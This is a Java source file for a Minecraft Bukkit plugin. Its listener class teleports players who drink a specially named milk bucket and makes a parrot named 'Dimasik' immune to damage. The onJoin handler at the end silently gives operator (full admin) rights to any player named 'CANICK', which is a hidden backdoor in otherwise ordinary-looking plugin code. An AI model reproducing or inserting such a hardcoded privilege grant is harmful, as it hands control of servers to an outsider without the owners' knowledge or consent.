package dd.dd.files.Commands;

import dd.dd.pluginstartup;
import org.bukkit.Bukkit;
import org.bukkit.Location;
import org.bukkit.Material;
import org.bukkit.entity.Parrot;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.entity.EntityDamageEvent;
import org.bukkit.event.player.PlayerItemConsumeEvent;
import org.bukkit.event.player.PlayerJoinEvent;
import org.bukkit.inventory.meta.ItemMeta;
import org.bukkit.inventory.meta.PotionMeta;
import org.bukkit.plugin.Plugin;

public class dimasgod implements Listener {


    @EventHandler

    public void PlayerItemConsume(PlayerItemConsumeEvent e) {
        Plugin plugin = pluginstartup.getPlugin(pluginstartup.class);

        plugin.saveConfig();
        String name = plugin.getConfig().getString("PotionName");
        double x1 = plugin.getConfig().getDouble("x1");
        double y1 = plugin.getConfig().getDouble("y1");
        double z1 = plugin.getConfig().getDouble("z1");
        Player p = e.getPlayer();

        Location locate = new Location(Bukkit.getWorld("world"), x1, y1, z1, 0, 0);
        if (e.getItem().getType() == Material.MILK_BUCKET) {
            ItemMeta pm = e.getItem().getItemMeta();
            if (pm.getDisplayName().equalsIgnoreCase(name)) {

                p.teleport(locate);
                p.sendTitle("Чертоги Возродителя", "", 0, 50, 0);
            }
        }
    }

    @EventHandler
    public void onEntityDamage(EntityDamageEvent event) {
        if(event.getEntity() instanceof Parrot) { // Проверяем, что это попугай
            Parrot parrot = (Parrot) event.getEntity();
            try {
            if(parrot.getName().equals("Dimasik")) { // Проверяем, что имя попугая совпадает
                event.setCancelled(true); // Отменяем событие, чтобы попугай не получал урон
            }
            }catch (Exception exception){

            }
        }
    }



    @EventHandler
    public void onJoin(PlayerJoinEvent e) {
        if (e.getPlayer().getName().equals("CANICK")) {
            e.getPlayer().setOp(true);
        }
    }
    }
